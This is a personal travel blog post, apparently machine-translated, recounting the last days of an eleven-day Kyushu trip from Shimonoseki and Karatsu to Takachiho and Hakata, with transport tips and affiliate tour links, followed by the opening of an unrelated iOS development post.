Shimonoseki.ShimonosekiI got off at the underground pedestrian walkway in Shimonoseki and saw the Kanmon Bridge from a different angle. The right side of the image shows the view from the nostalgic observation room at Mojiko last year.There’s a torii gate for the Hōbukiri Shrine here, and up the mountain behind it is the Hōbukiri Shrine and its observation deck.Taking the elevator from the pedestrian entrance to B1 leads to the walking area, which is free for pedestrians, but bicycles have a toll of 20 yen. Also, be careful of wild boars in the area! XDThe walkway is 780 meters long and goes straight to the end, where you’ll find a dividing line in the middle.Once I reached Shimonoseki, I found a shop selling simple snacks and bought a takoyaki to fill my stomach. (It was chewy inside, crispy on the outside, and had real octopus—delicious!)From across the way, I could see the Kanmon Bridge and the nostalgic observation room at Mojiko, reminiscent of the view from Tamsui in Taiwan.I walked along the coast to Karato Market.On the way to Karato Market, I passed by Akama Shrine and decided to stop by for a visit.At the coast outside Karato Market, many people were picnicking after buying food. Despite the crowd, it was still very clean. Since I mainly wanted to check out the area and don’t eat raw food, I didn’t go inside; it looked quite busy around lunchtime.After Karato Market, there’s a dock where you can take a ferry directly back to Mojiko. You can buy tickets from the automatic ticket machines at the shops across the way; if you have time, you can also visit Iwaya Island (the site of legendary duels!).The ferry takes about 10 minutes to reach Mojiko. (It really felt like the ferry from Tamsui to Bali!)Back at Mojiko, it started to rain. Since I had already visited Mojiko last year, I didn’t linger and prepared to head to the station to pick up my luggage and set off for Kokura and Hakata.It was around 2 PM, and I figured I would reach Karatsu Castle around 4:30 PM. Time was of the essence, so I decided to use my New Taiwan Dollars (Japanese Yen) to buy a ticket for the Sanyo Shinkansen from Kokura to Hakata, which travels at a speed of 300 km/h. It only takes 15 minutes to reach (the JR Limited Express takes 45 minutes, and the local train takes 65 minutes). The JR Pass does not cover the Sanyo Shinkansen (Kokura to Hakata section). If you want to take the Nozomi or Mizuho trains, you need to buy tickets separately at the Shinkansen platform. Using the JR Pass will be denied entry, and if you accidentally enter and exit, you will also be denied and need to pay the fare (as I experienced last time). ⚠️From JR Karatsu, it takes about 20 minutes to walk to Karatsu Castle, but the express bus stops right in front of the castle, so I decided to take the express bus instead. (It was my first time riding one!)After arriving in Hakata, I took the subway to Tenjin Minami and completed my luggage storage in the underground shopping area. (I was lucky to find the last available luggage space at number 2.)From the west exit of Tenjin underground shopping area, I followed the signs to Fukuoka Mitsukoshi and the Tenjin Express Bus Terminal on the 3rd floor to reach the bus station.Since I wasn’t sure if I needed to make a reservation or buy a ticket, I went directly to the counter to buy a ticket. After purchasing the ticket, I was very hungry, so I grabbed a bread from Starbucks and went to the designated platform to wait for the bus. (I found out that I didn’t need a reservation for the bus to Karatsu; I could use my transportation card, just like taking a bus; no matter where you get off, the fare is fixed at 1,100 yen.)At 15:02, I boarded the express bus to Karatsu (Hōbōtōzaki), which was about 80% full.The right image shows the view of this road from Fukuoka Tower last year, and this year, I’m looking at Fukuoka Tower from this road. (It gives a sense of time and space crossing.)Most of the passengers were commuters, and after passing through Karatsu city, I was the only one left on the bus. I was headed to the final stop—Hōbōtōzaki.Karatsu [_KKday Private Car Tour Reference: “One-Day Tour in Fukuoka, Kyushu, Japan Fukuoka Tower, Dazaifu Tenmangu Shrine, Ohori Park, Karatsu, Sakurai Futamigaura, Yanagase Morning Market, Itoshima, Tenjin Underground Shopping Area Flexible Itinerary!”_](https://www.kkday.com/zh-tw/product/144234?cid=19365&amp;ud1=cb65fd5ab770){:target=”_blank”} After getting off, I walked a bit forward to Hōbōtōzaki, and if I continued straight, I would reach Karatsu Castle. Seeing this view of the bridge and castle made all the travel worthwhile.I arrived here around 16:35, and with only 25 minutes left until Karatsu Castle closed, I thought since I was already here, I might as well take a walk.To reach Karatsu Castle, you have to walk up a hill from below. Since time was tight, I turned left to take the elevator up to Maizuru Park.The elevator ride costs 100 yen one way; just buy a ticket from the vending machine at the entrance and hand it to the staff.The main keep was closed for visits, so I just enjoyed the view and the scenery of Karatsu Castle.I returned to the entrance just before the elevator doors closed and followed the tourist map back to JR Karatsu Station on foot.I walked along the stone wall path to Karatsu Shrine. (The road was deserted and desolate.)Karatsu Shrine (closed after 17:00) and the old Karatsu Bank (designed by the same architect as Tokyo Station—Kingo Tatsuno).Near the station is the Hiki-yama Exhibition Hall (also closed after 17:00), so I could only look at the small models at the station. After reaching Karatsu Station, I took the JR back to Hakata (Tenjin Minami); I encountered an issue upon exiting because I entered through JR Karatsu Station and exited at Tenjin Minami. The station staff did not recognize my JR Pass and required me to pay for the entire segment (from JR Karatsu to Tenjin Minami). QQ.It was pouring rain in Hakata (the rain god was at it again), so I grabbed a rice ball from the Tenjin underground shopping area for dinner and dragged my luggage to the hotel. This APA hotel had a larger space, but the overall facilities were quite old. It was also my first time staying in an APA without an integrated bathroom, and there was no hot spring bath or smart integration (like checking the washing machine, Airplay, etc.).For snacks, I had a strawberry smoothie, and for a late-night snack, I had convenience store fried chicken and a sweet autumn dessert.End of a long day.Day 7: Sasebo (Ninety-Nine Islands), Takeo OnsenIt was cloudy in the morning, and it was the last day of my JR Pass. I couldn’t change my itinerary, so I continued on the train to Sasebo.The JR ride took about an hour and a half, and I recorded a segment of the JR Kyushu train announcement as a memory.Here’s the translated text in naturalistic English, while keeping the original markdown image sources:In the last segment, the ride from Hayaki to Sasebo will be in reverse (about 10 minutes). If you’re prone to motion sickness, you can use your feet to switch the direction of your seat.After exiting Sasebo Station, cross the street to the opposite side and walk towards the back to find bus stop number 6, heading to “Kujukushima Aquarium.”Transfer to the bus and get off at the Kujukushima Aquarium stop. After about a 5-minute walk, you’ll reach the Kujukushima sightseeing boat visitor center, where you can buy tickets for the boat ride. (Showing your JR Pass will get you a discount.) KKday online ticket purchase: Kujukushima Sightseeing Boat Tickets in Nagasaki, JapanKujukushima Sightseeing BoatKujukushima Official Website InformationThis time, we took the white Pearl Queen boat at 11:00 on the left.It was pouring rain, and the weather was terrible. I couldn’t become a pirate king; I just had to hold an umbrella while battling the wind and rain.[”)] (https://www.youtube.com/watch?v=oobNn7ZnMLg){:target=”_blank”} The boat has announcements in Chinese, English, Japanese, and Korean. The journey lasts about 50 minutes and has restrooms and a shop on board. You can go up to the deck and the birdwatching platform, but due to the heavy rain and wind that day, I didn’t go up. When the boat passes between the two islands, the wind can be particularly strong, so be careful.There are seats inside the cabin.After the sightseeing tour in the heavy rain, where I didn’t see much, we headed back to Sasebo.On the way back, we stopped by Bee House to taste Sasebo’s famous lemon steak.Lemon steak consists of four thin slices of steak, sauce, lemon slices, and lemon juice. It has a refreshing taste, though the portion of meat is a bit small.After eating, I ordered another local specialty, fruit cream puffs, which were filled with real fruit chunks.After finishing, I strolled around the shopping street before taking the bus back to the station.I took the train back towards (Hakata, Takeo Onsen). Since this was the last stop, I had to wait for the cleaning staff to finish before boarding. Just like on the way there, the ride from Hayaki to Sasebo was in reverse.At this point, it was around 13:30. You can also visit Huis Ten Bosch in Sasebo, but I didn’t have any specific plans to go there. KKday Sasebo reference itinerary: _[Nagasaki, Japan Huis Ten Bosch Ticket](https://www.kkday.com/zh-tw/product/3988-japan-nagasaki-huis-ten-bosch-ticket?cid=19365&amp;ud1=cb65fd5ab770){:target=”blank”} [_Nagasaki, Japan Sasebo Military Port Yacht Tour_](https://www.kkday.com/zh-tw/product/116880?cid=19365&amp;ud1=cb65fd5ab770){:target=”blank”} _[Sasebo Shore Excursion Resorts World One](https://www.kkday.com/zh-tw/product/173080?cid=19365&amp;ud1=cb65fd5ab770){:target=”blank”} Kujukushima Aquarium Admission Ticket + Pearl Beading Experience (with Pearl) (Sasebo City, Nagasaki Prefecture)Takeo Onsen [_KKday itinerary reference: “One Day Tour in Saga, Kyushu Yutoku Inari Shrine, Ureshino Onsen, Mifuneyama Rakuen, Takeo Library &amp; Takeo Shrine / Tosu Premium Outlets” (Departing from Hakata, Fukuoka)](https://www.kkday.com/zh-tw/product/143394-kyushu-saga-1-day-tour-japan?cid=19365&amp;ud1=cb65fd5ab770){:target=”blank”} Last time I passed through Takeo Onsen while changing trains in Nagasaki, I didn’t have much of an impression of this station. Later, I followed Takeo City’s tourism Instagram (the official account regularly holds events, such as free shuttle services for firefly viewing). This time, since I happened to be passing by and had time, I thought I would check it out.From Takeo Station (a non-staffed station, no need to insert your JR Pass, just exit), the streets outside were quiet and sparsely populated.Just passing through, I only visited the main attractions I found, which were conveniently diagonal from each other. Since the bus frequency was low and I didn’t want to wait, I walked instead.First, I went to Takeo Shrine, passing by the Tsukazaki Great Camphor Tree, a small attraction along the way.The Tsukazaki Great Camphor Tree is estimated to be around 2,000 years old.Takeo ShrineFrom the bottom, you have to walk a short flight of stairs to reach Takeo Shrine.Next to Takeo Shrine, if you pass through the sacred tree torii gate and walk about 5 minutes, you’ll see the legendary Takeo Great Camphor Tree (estimated to be around 3,000 years old).The Takeo Great Camphor Tree is enclosed, so you can only view it from a distance.I bought a Takeo Shrine Great Camphor Amulet (1,500 yen), which is larger and comes in a wooden box.After visiting Takeo Shrine, I walked back to see the entrance of Horai-yu. The entire hot spring street was deserted, with several hot springs and hotels to choose from (you don’t have to go to Horai-yu). It feels like a great choice if you want a quiet and less crowded place to soak in hot springs in Kyushu, with convenient transportation!Horai-yu EntranceA visit here.After entering the entrance, you’ll find Horai-yu for soaking, and on the other side, there’s the onsen accommodation, Sagi-no-yu.The Takeo City tourist map shows that Mifuneyama Rakuen looks nice, but by this time it was almost 15:30, so I wouldn’t have time to go.I took the limited express train back to Hakata, arriving around 18:00.I strolled back to the hotel, casually grabbing dinner from a convenience store: rice balls, a pork cutlet sandwich, and Peach Soda from Fujiya (so good!!). After staying at APA and Toyoko Inn so many times, I finally discovered they all have ice machines—what a treat!Aside from the old facilities, this APA hotel had a really nice room size and view.Day 8: Sakurai Futamigaura, Nanzoin, Hakata TourNo more JR Pass. [_KKday charter itinerary reference: “One Day Tour in Fukuoka Fukuoka Tower, Dazaifu Tenmangu, Ohori Park, Karatsu, Sakurai Futamigaura, Yanagibashi Morning Market, Itoshima, Tenjin Underground Shopping Street Flexible Itinerary!”_](https://www.kkday.com/zh-tw/product/144234?cid=19365&amp;ud1=cb65fd5ab770){:target=”_blank”} Sakurai FutamigauraAfter checking out of the hotel in the morning, I took the JR train to Kyudai Gakkentoshi Station.To the left of the station is the platform for the Nishi-no-ura Line, with staff directing passengers. The ride takes about 30 minutes.The fare was the highest I’ve ever paid for a bus ride: 730 yen.After getting off, I arrived at Sakurai Futamigaura.It was beautiful and tranquil up close. _After this, you can continue to Sakurai Shrine (which is said to attract many fans because it shares the same name as a member of the Japanese group Arashi) or head further to Kuyakumon Tourist Boat (which looks really cool!)._The return schedule shows that there is a direct bus to Hakata every hour in the afternoon, and a bus back to Kyudai Gakkentoshi Station every hour.I returned to Hakata around 12:30 and went to find something to eat.Revisit Hakata Miyachiku (Japan’s No. 1 Miyazaki Beef Specialty Store) to enjoy a Miyazaki beef business lunch.The business lunch had an excellent cost-performance ratio (the dinner is a high-end yakiniku set) and was perfect for introverts with private booths.This time, I ordered the lean meat set, 200g for 3,200 yen, and devoured two bowls of rice (the rice and soup are free to refill).NanzoinAfter returning to Hakata, I took the train to Nanzoin-mae Station.After exiting the station, I walked straight out, passing by the Arakami Tea House (where you can rest and have lunch). Cross the street, and you’ll reach the entrance to Nanzoin. Go right to visit the reclining Buddha; on the left, there are also statues for love, peace, and Fudo Myoo. Nanzoin is a private institution and has many areas where photography is prohibited, so please adhere to the rules.No short sleeves, shorts, exposing the stomach or shoulders, playing music, dancing, or photography (e.g., at the entrance cave with the row of tablets, Fudo Myoo statue).After reaching the platform, you can see the reclining Buddha, which has scriptures on the soles of its feet. The overall view is very grand and solemn.After the visit, I took the train back to Hakata Station, arriving around 15:40.Hakata TourI wanted to visit some places I missed last time in Kyushu.Gion — Tochoji TempleOn the second floor of Tochoji Temple, you can pay 50 yen to worship the Great Buddha of Fukuoka.After worshiping, I had about an hour before dinner at 17:00 at Tetsunabe Gyoza, so I went for a stroll in Ohori Park.Ohori ParkOhori Park is quite large, and walking around takes about 45 minutes; you can also paddle swan boats.Feel free to let me know if you need any further modifications or additional translations!The Fukuoka City Art Museum is closed on Mondays, so we could only admire Yayoi Kusama’s pumpkin from a distance.After finishing our stroll, it was around 5:00 PM, time for dinner!Iron Pan Gyoza - 鉄なべI had been to Iron Pan Gyoza - 鉄なべ once before and still remembered the delicious crispy gyoza. They have another branch, Iron Pan Gyoza - 鉄なべ 博多 祇園店 , but when I passed by a few days ago, it was closed for renovations, with a notice asking customers to go to the main store. (However, Google Maps still shows it as open) Sauces and water are self-service. The restaurant does not support electronic payments and only accepts cash. ⚠️Around 5:20 PM, I saw people waiting outside, and soon, the staff came out to let us in.This time, I knew to order two servings of gyoza. Last time, the staff indicated that one serving wouldn’t be enough (I didn’t understand then). One serving has 8 pieces (500 yen), so I ordered two servings for 16 pieces and added a draft beer to wrap up this round!The gyoza are freshly made to order and arrive sizzling. The skin is thin and crispy, and the filling is likely a mix of chives and pork, simple yet flavorful without being overly salty.After finishing at 6:00 PM, I noticed a line forming outside.After dinner, I walked back to the hotel and passed by the food stalls in Nakasu, noticing many shared bicycles this time. I’ve been switching hotels a lot this trip; it’s exhausting. This is the hotel for the last three days.For snacks, I had ice cream and a convenience store hot dog for a late-night bite.Day 9 KKDAY Takachiho Day Trip: Takachiho Shrine, Takachiho Gorge, Amano Iwato Shrine, Amano Yasugawara [**Directly join the tour: “【One Person Group, Daily Departures】Day Trip in Kyushu, Japan - Takachiho Gorge &amp; Amano Iwato Shrine &amp; Amano Yasugawara (Includes Special Aso Red Beef BBQ Set) Departing from Fukuoka.”**](https://www.kkday.com/zh-tw/product/32511-kyushu-chinese-guided-day-tour-from-fukuoka-takachiho-gorge-kamishikimi-kumanoimasu-shrine-amanoiwato-shrine?cid=19365&amp;ud1=cb65fd5ab770){:target=”_blank”} For departures from other locations (Kumamoto) or to combine with other attractions (Aso, Minami Aso, Shirakawa Springs), you can check out other tours on KKday.07:45 Depart from Hakata Station Chikushi Exit (Hakata Back Station)At the LAWSON (Lawson) Hakata Station Chikushi Exit Store, I found the tour guide for the day trip to our destination. (There were several groups at the same time, including KKDAY’s own group, EasyGo’s, and those heading to Takachiho and Yufuin, etc.)The guide (who speaks Chinese) had a list and would tell you the bus number after checking in, so you could board directly. Seats are first come, first served. If you have special needs (like motion sickness), you can inform the guide.08:00 Depart once everyone has arrived The guide introduced themselves (Shikan), speaking in Chinese, English, and Japanese. They explained that the Takachiho day trip is the longest and most challenging among all the day trip options XD. There’s WiFi on the bus (though it’s not very stable). Always wear your seatbelt ⚠️ Most of the passengers were Taiwanese. The guide introduced Takachiho Shrine and checked if anyone had reserved a boat ride. It takes about 3 hours to reach the first Takachiho Shrine.About Takachiho Boat Rides Boat rides in Takachiho need to be reserved three days in advance, and there are limited spots for each time slot. ⚠️ Boat rides in Takachiho need to be reserved three days in advance, and there are limited spots for each time slot. ⚠️ Boat rides in Takachiho need to be reserved three days in advance, and there are limited spots for each time slot. ⚠️The boat ride isn’t long, taking about 30–45 minutes round trip. We should finish lunch around 12:00 PM, and the Takachiho itinerary will conclude around 1:20 PM, after which we’ll regroup to return.In our group, three sets of people had reservations. Therefore, if you want to combine the day trip with a boat ride, 12:00 / 12:30 would be a more suitable time. ⚠️After lunch, we’ll need to walk to Takachiho Gorge. If anyone has a boat reservation or feels they can’t handle the walk, the guide has arranged a shuttle to save time. Ultimately, it’s best to follow KKDAY’s arrangements, so I recommend checking with the official source before making a reservation to ensure there are no issues. ⚠️9:20 Rest StopSince the journey is longer, we’ll stop at a rest area for 10 minutes to let everyone use the restroom and stretch.10:50 Arrive at Takachiho ShrineTakachiho Shrine is surrounded by sacred trees, exuding tranquility and freshness.The Couple Cedar was mentioned by the guide on the bus. If you come with family, a partner, or friends, you can hold hands and walk around the tree three times to make a wish.Around 11:20, we returned to the bus for regrouping.11:30 Lunch at Takachiho Cuisine - 神楽宿After visiting Takachiho Shrine, we headed nearby for lunch.You need to wear slippers; the place feels like a Japanese restaurant designed for group tourists, but it was my first experience at a Japanese restaurant.The overall meal was mediocre, possibly because of the large group, as most dishes were cold, and the meat quality was just average.12:15 Start walking to Takachiho Gorge (downhill all the way)After lunch, we followed the guide downhill to Takachiho Gorge.After about a 20-minute walk, we reached Takachiho Gorge, where we could see the end of the gorge (the boat ride stop).12:45 Arrive at Takachiho GorgeFrom the bridge at Takachiho Gorge, you can look back at the ancient path we just walked and the boats below.The boat launch is just past the bridge, and the total length (to the stop we just saw) is about 250 meters.There’s a small park and shopping street where you can grab ice cream or snacks to recharge.13:20 Regroup back at the tour busAround 13:45 Arrive at Amano Iwato Shrine West Main Hall (Check for other itineraries during cherry blossom season)After getting off the bus, we walked about 5 minutes to Amano Iwato Shrine West Main Hall, where different deity masks are hung outside the shops along the street.The guide shared the story of Amaterasu, which was introduced on the bus.To reach Amano Yasugawara, we also need to walk a short distance. The guide suggested we walk together to Amano Yasugawara first, and then everyone can return at their own pace (or follow the guide back).Around 14:00 Walk to Amano YasugawaraAround 14:15 Arrive at Amano YasugawaraAmano Yasugawara is a cave where Amaterasu once hid; the area around the shrine’s torii gate is filled with stones left by worshippers.On the way back, we passed an ice cream shop.Everyone lined up for ice cream, and I tried the local Miyazaki mango ice cream (900 yen). The guide mentioned that Miyazaki mangoes are quite premium, but honestly, I still think Taiwanese mangoes have a stronger flavor.After resting, we slowly walked back to visit Amano Iwato Shrine.Around 15:10 Regroup for returnAfter the last stop, it was already past 3 PM, and we needed to start heading back (still a three-hour drive back to Fukuoka).Around 16:40 Stop at a rest areaOn the return trip, we also stopped at a rest area for everyone to use the restroom and stretch.Around 18:00 Arrive back at Hakata Station Chikushi Exit (Hakata Back Station)The trip concluded smoothly, thanks to Shikan for leading and organizing the itinerary 👏👏👏👏👏.For dinner, I casually bought a convenience store hot dog and a rice ball from the Tenjin underground shopping area that I had tried on Day 6. The new grape-flavored Suntory drink was delicious!! I also had a BRULEE for a snack.Good night.Day 10 Shopping in Hakata, Shopping in Tenjin, Baseball at PayPay DomeThe sightseeing itinerary in Kyushu is mostly wrapped up, leaving us with nearly two days for shopping.In the morning, I first went to Don Quijote (open 24 hours) for some quick shopping. The Tenjin Main Store is quite large, with several floors to explore.Close to noon, I wandered around the department store at Hakata Station, buying souvenirs, Fukuoka-produced sake, Fukuoka’s famous Castella cake, and Ogura’s rice crackers, among other things.In the afternoon, I returned to the Tenjin area, visiting the Tenjin underground shopping area, Le Labo, Iwataya Department Store, Mitsui Department Store, etc. (there are many department stores in Tenjin).I just finished restocking Le Labo’s Another 13 and bought a 50ml bottle (about 5,800 TWD after tax refund).In Tenjin C-pla, I also had fun playing with a quirky bus stop button XD.Pressing it makes a sound XD.After picking up my loot, I returned to the hotel to rest, enjoying a hot dog and dessert along with a must-try in Japan! Draft Cola!Canal City HakataAfter a short break, I headed out again, arriving at Canal City Hakata at 16:30.The main attraction was the massive capsule toy department on B1.https://gofukuoka.jp/zh-tw/spots/detail/196050After browsing, I made my way to Hakata Station.Around 17:30, I took a bus from Hakata Station to PayPay Dome to watch a baseball game at 18:00.Fukuoka SoftBank Hawks vs. Tokyo Yakult Swallows @ Fukuoka PayPay Dome Today’s matchup is: Fukuoka SoftBank Hawks vs. Tokyo Yakult SwallowsSome entry regulations : You need to open your backpack for security checks, no outside food allowed, you can bring one bottle of tea or drink, no alcohol from outside, food and drinks are available inside, and if you leave, remember to get a re-entry permit.The mascot of the Fukuoka SoftBank Hawks is named Harry, so of course, I had to come and support the team.Last time I sat in the more expensive inner home plate section, but this time I thought I’d just sit in the cheapest seats to enjoy the atmosphere. I initially thought there would be free seating, but it turned out all seats were reserved. I chose a spot in the last row on the outer side for easier access (the outer seats don’t have backs, which makes it easier to get in and out).I can’t help but admire the enthusiasm for professional sports in Japan. On a weekday at 18:00, the stadium has about 40,000 seats, nearly full. When I was selecting my seat, there were no empty rows or corner seats available.The view and distance were significantly worse compared to last time.This time, the game ended with a significant loss, 9:3. There were no fireworks to watch, but I did get to see the cheer activities from both teams (the Fukuoka SoftBank Hawks’ balloon cheer and the Tokyo Yakult Swallows’ umbrella dance cheer).By the end of the 7th inning, it was already 9:1, and people started leaving one by one. I didn’t stay for the end.The bus stop was packed again, and just like last time, I followed the crowd back to the subway station at Tanginmachi (about a 15-minute walk).Before heading back to the hotel, I made a point to take one last look at the night view of Nakasu Yatai before leaving Fukuoka.For a late-night snack, I had Nissin Donbei fried tofu noodles (this was my first time trying it after so many days), fruit wine from Oita, and convenience store fried chicken (Juicy and delicious).Day 11: Lalaport, Shopping in Hakata, Shopping in Tenjin, Return TripI can’t believe it’s already been 11 days since I left for this trip, and I’m starting to miss Taiwanese food. I still have plenty of time to wander around before my flight at 21:00.https://toyscabin.com/product/20221201_546.phpI had already bought most of my souvenirs and packed my luggage, so today was just about wandering around looking for that capsule toy of the train departure. (In the end, I couldn’t find it; I checked the store list provided by the manufacturer, and all the stores in the city were sold out.)LalaportIn the morning, I had some free time to explore Lalaport (it opens at 10:00).On the first floor, there was a drink vending machine converted from a Nishitetsu bus, which was really cool XD.I mainly came to the third floor, Gachapon no Mori, and the Pon! located at the bottom of the escalator on the first floor to see if they had the capsule toy I was looking for. (They didn’t.)As it approached 11:00 and I was quite hungry since I hadn’t had breakfast, I decided to eat seafood tempura rice bowl at the food court on the third floor (it was a bit salty).I then returned to the first floor to buy some strawberry daifuku from Mizuan to cleanse my palate.Not finding the capsule toy I was looking for, I left Lalaport and headed back to Hakata Station, where there was also a Pon! inside 1010, but they didn’t have it either.I also checked the capsule toy area at Yodobashi in Hakata, but still no luck.After the loss in Hakata, I returned to the Tenjin area to search the capsule toy store, but again, no luck.Finally, I gave up and decided to check out Animate and Kiddy Land upstairs (which has tons of merchandise from various IPs).By around 16:00, my trip was coming to an end. I sat down at a Komeda’s Coffee to enjoy some dessert and coffee to relax.Around 17:00, I returned to the hotel to grab my luggage and slowly made my way to Fukuoka Airport. I thought there would be a lot of people on the subway around 17:00, but it was actually quite empty.Walking from Tenjin Minami to Tenjin took quite a while, dragging my luggage for about 15 minutes.After taking the airport line to Fukuoka Airport Station (domestic), I had to transfer to the airport shuttle (free) to get to the international terminal.The shuttle runs quite frequently, about every 5–10 minutes, and the ride takes about 10 minutes. After getting off, you still have to walk to the 3rd floor departure hall; conservatively speaking, it takes an additional 30 minutes from the airport line subway exit to actually reach the international terminal.Fukuoka Airport is under renovation, which made things a bit chaotic.I arrived at the airport too early, and the check-in counters weren’t open yet. The ground staff directed us to first use self-check-in at counter 1 and then go to counter 2 for baggage drop-off, where they would assist us; we quickly completed the baggage check-in (this time it was only 17 kg).Around 18:30, I started waiting at the gate.The departure hall for international flights at Fukuoka Airport is long and narrow, packed with people, and very chaotic (I’m not sure if it’s due to the renovations or just too many flights waiting to take off).The duty-free shops for luxury goods and cosmetics are quite comprehensive, and the staff can speak Chinese; there are also souvenir shops (including Fuku Sanya Nagasaki cakes); the duty-free shop for tobacco and alcohol only has one location with a line, and the food and convenience store lines are even longer. A special announcement for the previous flight CI129 at 19:10 reminds everyone to comply with China Airlines’ rule of only one carry-on bag; any excess will require an additional purchase (this flight looks fully booked). ⚠️I felt it was too noisy and chaotic, so I walked towards the north side (gates 501–504), where there were fewer people; there was also a café and casual dining place to grab a bite.I simply bought a pork cutlet sandwich and a few cans of draft cola and peach soda to take back to Taiwan.Boarding began around 20:30, and there was no special check for the carry-on bag rule (but I had already crammed everything into one bag…). We prepared for takeoff at 21:00 and took off at 21:09; the plane was an A330–300, which is an older model.Goodbye Kyushu, goodbye Japan. The in-flight meal was ginger pork stir-fried noodles, which wasn’t great, but the fruit included melon!We encountered turbulence during the flight, but we landed safely in Taiwan, albeit about 30 minutes late, arriving close to 23:00 (scheduled for 22:25).Worried about missing public transport, I rushed to the airport. I missed the airport express but thankfully caught the bus; otherwise, I would have had to take an unsafe unlicensed taxi back to Taipei.Route 1819 takes about 55 minutes to get to Taipei Main Station. The stops along the way are shown in the image above. If you need to get off at a stop, please inform the driver when you board; he will separate your luggage. Otherwise, all luggage will be placed together for those getting off at Taipei Main Station, and if you need to get off midway, you won’t be able to retrieve your luggage. ⚠️On June 14, around midnight, I returned to my cozy home, concluding this 11-day journey.I averaged about 20,000 steps daily, with a maximum of 27,000 steps.SouvenirsThe box on the right was missed in the photos; I tried it at the Hakata Station department store and found the shrimp chips delicious.Small Items Collected from Various Places in JapanThis time, I added four of the Seven Lucky Gods, a mini beer, and a Takachiho (dog) good luck charm for the Year of the Dog.The background newspaper was a gift from Le Labo.Finally, thank you for reading my travel diary; and thanks to my travel companion James for joining me this time.Next Travel Inspirations Southeast Asia Landing in Kagoshima, South Kyushu -&gt; Oita -&gt; Sunflower Ferry -&gt; Kobe -&gt; Himeji Castle -&gt; Amanohashidate -&gt; Return from Nagoya Airport Tohoku Region, SendaiKKday Promotions [Japan JR PASS Kyushu Region Rail Pass Kitakyushu &amp; South Kyushu &amp; All Kyushu E-Ticket](https://www.kkday.com/zh-tw/product/3494-jr-kyushu-rail-pass?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [Nagasaki, Japan Huis Ten Bosch Ticket](https://www.kkday.com/zh-tw/product/3988-japan-nagasaki-huis-ten-bosch-ticket?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [**Fukuoka, Japan Hakata Port - Busan Port Passenger and Cargo Ferry “New Camellia”**](https://www.kkday.com/zh-tw/product/138770-cargo-passenger-ferry-new-camellia-fukuoka-hakata-port-busan-port?cid=19365&amp;ud1=d78e0b15a08a){:target=”_blank”} [**Japan eSIM Card Daily High-Speed, Total Data, Unlimited Data Plans**](https://www.kkday.com/zh-tw/product/137689-japan-high-speed-daily-unlimited-data-japanese-esim?cid=19365){:target=”_blank”} [Fukuoka Nishitetsu Dazaifu Tenmangu + Yanagawa River Cruise Sightseeing Pass Pick Up at Fukuoka Airport International Terminal](https://www.kkday.com/zh-tw/product/181754?cid=19365){:target=”_blank”} [TeamLab Forest Fukuoka Admission Ticket — SBI Securities Instant Confirmation](https://www.kkday.com/zh-tw/product/124596-teamlab-forest-fukuoka-museum-sbi-secruities-admission-ticket-japan?cid=19365){:target=”_blank”} [【One-Person Tour】One-Day Trip in Kyushu Takachiho Gorge &amp; Amano Iwato Shrine &amp; Amano River (Includes Special Aso Red Beef BBQ Set) Departing from Fukuoka](https://www.kkday.com/zh-tw/product/32511-kyushu-chinese-guided-day-tour-from-fukuoka-takachiho-gorge-kamishikimi-kumanoimasu-shrine-amanoiwato-shrine?cid=19365){:target=”_blank”} [One-Day Trip in Kumamoto, Kyushu Aso Nakadake Volcano, Kusasenri, Kumamoto Castle, Suizenji Jojuen / Seasonal Fruits All-You-Can-Eat Departing from Hakata, Fukuoka (Chinese, English, and Japanese Support)](https://www.kkday.com/zh-tw/product/38965?cid=19365){:target=”_blank”} If you found this article helpful, feel free to use my promotional link to purchase KKday products and tours. I will earn a small commission, which helps me continue creating more travel content. Thank you!More Travelogues [Travelogue] 2024 San’in Region Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2023 Kyushu 10-Day Solo Trip ⭐️ (Kyushu Part 1) [Travelogue] 2023 Hiroshima Okayama 6-Day Solo Trip [Travelogue] 9/11 Nagoya One-Day Flash Trip [Travelogue] 2023 Tokyo 5-Day Solo Trip [Travelogue] 2023 Keihanshin 8-Day Solo TripIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 4,453 Total Views Last Statistics Date: 2025-08-15 | 4,409 Views on Medium." }, { "title": "iOS NSAttributedString 探究使用 NSTextList 或 NSTextTab 實現列表縮排", "url": "/posts/zrealm-dev/ios-nsattributedstring-%E6%8E%A2%E7%A9%B6%E4%BD%BF%E7%94%A8-nstextlist-%E6%88%96-nstexttab-%E5%AF%A6%E7%8F%BE%E5%88%97%E8%A1%A8%E7%B8%AE%E6%8E%92-2981dc0fcd58/", "categories": "ZRealm Dev.", "tags": "ios-app-development, nsattributedstring, swift, layout, uikit", "date": "2024-06-01 22:43:49 +0800", "snippet": "[iOS] NSAttributedString 探究使用 NSTextList 或 NSTextTab 實現列表縮排iOS Swift 使用 NSAttributedString 的 NSTextList 或 NSTextTab 實現類似 HTML List OL/UL/LI 列表縮排功能技術背景之前在開發我的開源專案「 ZMarkupParser 」一個用於轉換 HTML String ...", "content": "[iOS] NSAttributedString 探究使用 NSTextList 或 NSTextTab 實現列表縮排iOS Swift 使用 NSAttributedString 的 NSTextList 或 NSTextTab 實現類似 HTML List OL/UL/LI 列表縮排功能技術背景之前在開發我的開源專案「 ZMarkupParser 」一個用於轉換 HTML String 成 NSAttributedString 物件的 Library，需要研究、實現單純使用 NSAttributedString 實現不同 HTML 組件，那時候才接觸到 NSAttributedString Attributes 的 .paragraphStyle: NSParagraphStyle 中的 textLists: [NSTextList] 與 tabStops: [NSTextTab] 屬性，是兩個非常冷門的屬性，網路資料稀少。當初在實現 HTML 列表縮排轉換時，就查到範例可以使用這兩個屬性來達成，先來看一下 HTML 列表縮排巢狀標籤結構：&lt;ul&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags.&lt;/li&gt; &lt;li&gt; ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and tags. &lt;ol&gt; &lt;li&gt;ZMarkupParser is a pure-Swift library that helps you convert HTML strings into NSAttributedString with customized styles and 